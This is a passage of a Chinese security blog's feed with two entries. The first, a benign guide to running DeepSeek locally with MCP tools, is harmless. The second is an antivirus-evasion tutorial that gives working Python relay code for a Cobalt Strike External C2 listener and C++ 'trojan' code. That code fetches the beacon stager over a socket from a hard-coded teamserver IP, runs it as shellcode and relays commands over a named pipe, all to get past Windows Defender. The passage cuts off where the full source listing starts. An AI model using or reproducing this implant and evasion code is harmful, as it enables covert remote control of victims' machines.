&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/XjaPdNwqABFqDZsZTDtZJg&quot;&gt;https://mp.weixin.qq.com/s/XjaPdNwqABFqDZsZTDtZJg&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【AI】本地部署DeepSeek并使用MCP</title>
    <link href="https://joe1sn.eu.org/2025/04/05/local-deepseek-MCP/"/>
    <id>https://joe1sn.eu.org/2025/04/05/local-deepseek-MCP/</id>
    <published>2025-04-05T06:47:50.000Z</published>
    <updated>2025-04-05T07:38:27.951Z</updated>
    
    <content type="html"><![CDATA[<p>主要是一些配置，同时算是备忘手册</p><span id="more"></span><h1 id="本地部署deepseek"><a class="markdownIt-Anchor" href="#本地部署deepseek"></a> 本地部署DeepSeek</h1><p>首先是部署DeepSeek R3</p><p>我是使用的是<code>LM Studio</code>，下载链接：<a href="https://lmstudio.ai/">https://lmstudio.ai/</a></p><p>下载完成后需要按照如下逻辑结构创建文件夹：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405150022259.png" alt="image-20250405150022259" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405150116645.png" alt="image-20250405150116645" /></p><p>然后下载DeepSeek的模型，国内可以通过魔塔社区等下载，会快很多。</p><p>我的显卡是<code>GTX1650 MaxQ</code>，<strong>显存</strong>只有4G。使用：<a href="https://modelscope.cn/models/lmstudio-community/DeepSeek-R1-Distill-Qwen-7B-GGUF/files">DeepSeek-R1-Distill-Qwen-7B-GGUF</a></p><p>AI相关最重要的就是显卡的显存，关于显卡参数可以在 任务管理器 -&gt; 性能 中看到，如果只有一个intel的集显，那么得下载对应的显卡驱动。</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405150342161.png" alt="image-20250405150342161" /></p><ul><li><code>deepseek 1.5b</code>：几乎没有显卡要求</li><li><code>deepseek 7b</code>： 至少4G显存</li><li><code>deepseek 8b</code>： 至少6G显存</li><li><code>deepseek 14b</code>： 12G显存</li><li><code>deepseek 32b</code>：至少24G显存</li></ul><p>如果配置正确就可以在LM Studio中看到了</p><p><img src="C:%5CUsers%5C13013%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250405151008485.png" alt="image-20250405151008485" /></p><p>一般配置如下</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405151041947.png" alt="image-20250405151041947" /></p><p>建议开启 <strong>闪电注意力(Fast attention)</strong>，同时如果需要使用MCP建议将上下文长度改为至少 <strong>8192</strong></p><p>等待模型加载后即可使用。 <strong>使用完成后记得弹出！</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405151234629.png" alt="image-20250405151234629" /></p><h1 id="mcp使用"><a class="markdownIt-Anchor" href="#mcp使用"></a> MCP使用</h1><p>这里讲最简单的使用：下载一个 <a href="https://github.com/nanbingxyz/5ire">5ire</a></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405151425961.png" alt="image-20250405151425961" /></p><p>在这里设置相关参数，如：<strong>使用Deepseek的官方API</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405151500341.png" alt="image-20250405151500341" /></p><p><strong>如果使用本地的AI，需要设置下LM Studio</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405151547866.png" alt="image-20250405151547866" /></p><p>然后在<code>5ire</code>中设置如下：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405151619366.png" alt="image-20250405151619366" /></p><p>这里的模型应该在连接成功后即可使用选择，并且在LM Studio中能看到API请求如下</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405151713767.png" alt="image-20250405151713767" /></p><p>在<code>工具</code>-&gt;<code>工具市场</code>中可以看到许多MCP Server，这里已<strong>Web</strong>举例，这个MCP的功能是访问网页</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405151809886.png" alt="image-20250405151809886" /></p><p>安装完成后需要在工具中启用</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405151913412.png" alt="image-20250405151913412" /></p><p>之后点击 <strong>新对话</strong> 就可以使用了，如：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405152327299.png" alt="image-20250405152327299" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405152338926.png" alt="image-20250405152338926" /></p><p>然后是本地的效果，反应的速度取决显卡，一般来说巨卡。因为本地模型是小参数，要笨很多，所以promote要详细些</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405152450640.png" alt="image-20250405152450640" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405152642932.png" alt="image-20250405152642932" /></p><h1 id="安装mcp"><a class="markdownIt-Anchor" href="#安装mcp"></a> 安装MCP</h1><p>在工具中新建即可，这里用<code>ida-pro-mcp</code>这个举例</p><p>官方的json配置格式如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;mcpServers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;github.com/mrexodia/ida-pro-mcp&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;uv&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;--directory&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;c:\\MCP\\ida-pro-mcp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;run&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;server.py&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;--install-plugin&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;timeout&quot;</span><span class="punctuation">:</span> <span class="number">1800</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;disabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;autoApprove&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;check_connection&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_metadata&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_function_by_name&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_function_by_address&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_current_address&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_current_function&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;convert_number&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;list_functions&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;list_strings&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;search_strings&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;decompile_function&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;disassemble_function&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_xrefs_to&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_entry_points&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;set_comment&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;rename_local_variable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;rename_global_variable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;set_global_variable_type&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;rename_function&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;set_function_prototype&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;declare_c_type&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;set_local_variable_type&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;alwaysAllow&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;check_connection&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_metadata&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_function_by_name&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_function_by_address&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_current_address&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_current_function&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;convert_number&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;list_functions&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;list_strings&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;search_strings&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;decompile_function&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;disassemble_function&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_xrefs_to&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;get_entry_points&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;set_comment&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;rename_local_variable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;rename_global_variable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;set_global_variable_type&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;rename_function&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;set_function_prototype&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;declare_c_type&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;set_local_variable_type&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>在5ire中如下，他会自动完善其他参数</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405152815121.png" alt="image-20250405152815121" /></p><h1 id="关于mcp管理"><a class="markdownIt-Anchor" href="#关于mcp管理"></a> 关于MCP管理</h1><p>这里说了5ire，也可以使用其他的，个人认为比较初略的框架可以试试<code>mcp-bridge</code>，因为他只做了中间服务，连ui都没有，方便二次开发</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250405153747247.png" alt="image-20250405153747247" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;主要是一些配置，同时算是备忘手册&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="AI" scheme="https://joe1sn.eu.org/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】使用CobaltStrike的外置监听器绕过检测</title>
    <link href="https://joe1sn.eu.org/2025/02/28/cs-external/"/>
    <id>https://joe1sn.eu.org/2025/02/28/cs-external/</id>
    <published>2025-02-28T14:23:28.000Z</published>
    <updated>2025-02-28T14:26:11.536Z</updated>
    
    <content type="html"><![CDATA[<p>可能是最简单一种免杀方式了</p><p>公众号：<a href="https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg">https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg</a></p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="免杀使用cobaltstrike的外置监听器绕过检测"><a class="markdownIt-Anchor" href="#免杀使用cobaltstrike的外置监听器绕过检测"></a> 【免杀】使用CobaltStrike的外置监听器绕过检测</h1><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>起源于一次免杀马的制作，当我制作好了过后，在windows defender（后文简称为<code>wd</code>）中测试时</p><ul><li>[x] 本地扫描能够通过</li><li>[x] CobaltStrike TeamServer能显示木马的正常上线</li><li>[ ] <strong>上线后本地木马立即被查杀</strong></li></ul><h2 id="结论"><a class="markdownIt-Anchor" href="#结论"></a> 结论</h2><p><strong>这里直接上结论，想要知道原因可以看下文</strong></p><p>首先给出<strong>猜测</strong>：是windows defender有类似的waf，并且由于<code>cobaltstrike</code>的<code>stager payload</code>的加载方式被<code>wd</code>识别出</p><p><strong>给出解决办法：想办法加密/混淆<code>Teamserver</code>和<code>Tojan</code>的流量</strong>，类似于下图</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250228222403412.png" alt="image-20250224204001461" /></p><p>在CS上有一种监听器叫做：<strong>External C2</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250228222403407.png" alt="image-20250224201235596" /></p><p>只需要绑定本地的端口即可</p><p><strong>同时我们需要编写一个 转发器、收发的torjan</strong></p><h3 id="转发器编写"><a class="markdownIt-Anchor" href="#转发器编写"></a> 转发器编写</h3><p>为了方便，这里就使用<strong>Tcp socket</strong>进行编写</p><p>首先需要一个转发的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExternalC2Controller</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, port</span>):</span><br><span class="line">        self.port = port</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encodeFrame</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="built_in">len</span>(data)) + data</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="built_in">len</span>(data)) + data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decodeFrame</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="built_in">len</span> = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, data[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">        body = data[<span class="number">4</span>:]</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">len</span>, body)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sendToTS</span>(<span class="params">self, data</span>):</span><br><span class="line">        self._socketTS.sendall(self.encodeFrame(data))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recvFromTS</span>(<span class="params">self</span>):</span><br><span class="line">        data = <span class="string">b&quot;&quot;</span></span><br><span class="line">        _<span class="built_in">len</span> = self._socketTS.recv(<span class="number">4</span>)</span><br><span class="line">        l = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, _<span class="built_in">len</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(data) &lt; l:</span><br><span class="line">            data += self._socketTS.recv(l - <span class="built_in">len</span>(data))</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sendToBeacon</span>(<span class="params">self, data</span>):</span><br><span class="line">        self._socketClient.sendall(self.encodeFrame(data))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recvFromBeacon</span>(<span class="params">self</span>):</span><br><span class="line">        data = <span class="string">b&quot;&quot;</span></span><br><span class="line">        _<span class="built_in">len</span> = self._socketClient.recv(<span class="number">4</span>)</span><br><span class="line">        l = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, _<span class="built_in">len</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(data) &lt; l:</span><br><span class="line">            data += self._socketClient.recv(l - <span class="built_in">len</span>(data))</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># First thing, wait for a connection from our custom beacon</span></span><br><span class="line">        self._socketBeacon = socket.socket(</span><br><span class="line">            socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">        self._socketBeacon.bind((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">12222</span>))</span><br><span class="line">        self._socketBeacon.listen(<span class="number">1</span>)</span><br><span class="line">        self._socketClient = self._socketBeacon.accept()[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received C2 connection&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Now we have a beacon connection, we kick off comms with CS External C2</span></span><br><span class="line">        self._socketTS = socket.socket(</span><br><span class="line">            socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">        self._socketTS.connect((<span class="string">&quot;192.168.48.129&quot;</span>, self.port))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Send out config options</span></span><br><span class="line">        self.sendToTS(<span class="string">&quot;arch=x86&quot;</span>)</span><br><span class="line">        self.sendToTS(<span class="string">&quot;pipename=xpntest&quot;</span>)</span><br><span class="line">        self.sendToTS(<span class="string">&quot;block=1000&quot;</span>)</span><br><span class="line">        self.sendToTS(<span class="string">&quot;go&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Receive the beacon payload from CS to forward to our custom beacon</span></span><br><span class="line">        data = self.recvFromTS()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Sending %d bytes to beacon&quot;</span> % <span class="built_in">len</span>(data))</span><br><span class="line">            self.sendToBeacon(data)</span><br><span class="line"></span><br><span class="line">            data = self.recvFromBeacon()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Received %d bytes from beacon&quot;</span> % <span class="built_in">len</span>(data))</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Sending %d bytes to TS&quot;</span> % <span class="built_in">len</span>(data))</span><br><span class="line">            self.sendToTS(data)</span><br><span class="line"></span><br><span class="line">            data = self.recvFromTS()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Received %d bytes from TS&quot;</span> % <span class="built_in">len</span>(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">controller = ExternalC2Controller(<span class="number">2222</span>)</span><br><span class="line">controller.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要说明的是，<strong>转发器</strong>和<code>teamserver</code>之间的通讯tcp报文是</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250228222403389.png" alt="image-20250224203243887" /></p><p>也就是说先从tcp流中读取4字节，然后这4字节作为长度，再从流中读取这一长度的剩余报文。这一点也可以从<code>recvFromBeacon</code>看出</p><p>首先创建和 <strong>teamserver</strong>的 <strong>externalC2</strong>监听器的<strong>socket</strong>连接，然后监听<strong>本地的12222</strong>端口的tcp流量，一旦有请求流向<strong>监听的12222</strong>端口，就开始向<strong>teamserver</strong>传输上线信息，其中</p><ul><li><strong>arch</strong>：torjan的位数</li><li><strong>pipename</strong>：需要使用到的管道名称，在程序中就为<code>\\,\pipe\$&#123;pipename&#125;</code></li><li><strong>go</strong>：表示传输初始化信息完毕，torjan已经上线</li></ul><p>当 <strong>teamserver</strong>收到torjan上线消息后，会返回一段<strong>data</strong>，这段<strong>data</strong>就是stager(有阶段)的第二段payload，通过之前讲过的<strong>反射式dll注入</strong>运行，<strong>由于使用的dll被各种标记，所以这里很有可能被检测出</strong>，<strong>如果对teamserver的这段dll进行加密后再发送给torjan</strong>，那么在torjan内，<strong>至少这段dll解密进入内存之前是安全的</strong></p><h3 id="第三方客户端编写"><a class="markdownIt-Anchor" href="#第三方客户端编写"></a> 第三方客户端编写</h3><p>也就是我们的马子，torjan</p><p>根据上面的简单分析，主要过程如下：</p><ol><li>创建到<strong>转发器</strong>的socket</li><li>接收并<s>解密</s><strong>转发器</strong>返回的shellcode，想办法<strong>运行这段shellcode</strong></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   DWORD payloadLen = <span class="number">0</span>;</span><br><span class="line">   <span class="type">char</span> *payloadData = <span class="literal">NULL</span>;</span><br><span class="line">   HANDLE beaconPipe = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 连接到转发器</span></span><br><span class="line">   SOCKET c2socket = <span class="built_in">createC2Socket</span>(<span class="string">&quot;192.168.48.129&quot;</span>, <span class="number">12222</span>);</span><br><span class="line">   payloadData = <span class="built_in">recvData</span>(c2socket, &amp;payloadLen);</span><br><span class="line"></span><br><span class="line"><span class="comment">//运行shellcode</span></span><br><span class="line">   <span class="built_in">spawnBeacon</span>(payloadData, payloadLen);</span><br></pre></td></tr></table></figure><p>如果你逆向分析过cs生成的artifact.exe，你会发现它使用管道通讯</p><p><strong>为什么要使用管道通讯呢？</strong></p><p>之前在讲转发器的最后一个部分，因为第二段payload是一个dll，<strong>如何保持该dll和主程序之间的通讯？<strong>解决的方法就是使用</strong>命名管道</strong>，这也是为什么要在初始上线的时候传输管道的名称，这样才能生成torjan生成的<strong>torjan_dll</strong>。</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250228222403421.png" alt="image-20250224211220992" /></p><p>通过管道将：teamserver-&gt;转发器-&gt;torjan 的数据，通过管道传输到 <strong>torjan_dll</strong>，反之亦然</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Loop until the pipe is up and ready to use</span></span><br><span class="line"><span class="keyword">while</span> (beaconPipe == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    <span class="comment">// Create our IPC pipe for talking to the C2 beacon</span></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">500</span>);</span><br><span class="line">    beaconPipe = <span class="built_in">connectBeaconPipe</span>(<span class="string">&quot;\\\\.\\pipe\\xpntest&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Start the pipe dance</span></span><br><span class="line">    payloadData = <span class="built_in">recvFromBeacon</span>(beaconPipe, &amp;payloadLen);</span><br><span class="line">    <span class="keyword">if</span> (payloadLen == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sendData</span>(c2socket, payloadData, payloadLen);</span><br><span class="line">    <span class="built_in">free</span>(payloadData);</span><br><span class="line"></span><br><span class="line">    payloadData = <span class="built_in">recvData</span>(c2socket, &amp;payloadLen);</span><br><span class="line">    <span class="keyword">if</span> (payloadLen == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sendToBeacon</span>(beaconPipe, payloadData, payloadLen);</span><br><span class="line">    <span class="built_in">free</span>(payloadData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于管道数据的解析，和转发器到teamserver的一致</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250228222403410.png" alt="image-20250224211909556" /></p><p>测试一下windows defender</p><p>这里就简单测试下没有加密过的</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250228222403437.png" alt="image-20250224214138493" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250228222404128.png" alt="image-20250224214408301" /></p><p>完整代码如下，建议使用 Visual Studio，位数x86 编译</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 